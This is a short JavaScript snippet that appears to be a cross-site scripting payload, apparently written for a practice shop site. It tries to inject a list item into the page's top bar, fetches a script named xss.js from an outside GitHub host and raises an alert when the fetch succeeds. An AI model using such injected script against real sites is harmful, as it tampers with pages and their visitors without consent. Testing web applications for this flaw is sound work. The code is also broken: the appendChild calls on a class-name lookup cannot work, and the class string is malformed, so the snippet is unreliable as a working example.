var node = document.createElement("LI"); // Create a <li> node
var textnode = document.createTextNode("Water"); // Create a text node
node.appendChild(textnode); // Append the text to <li>
document.getElementsByClassName("class=top-bar-section").appendChild(node); // Append <li> to <ul> with id="myList"


document.getElementsByClassName("class=top-bar-section").appendChild(node);



let response = await fetch('https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xss.js');

if (response.ok) { // if HTTP-status is 200-299
    // get the response body (the method explained below)
    alert("100");
}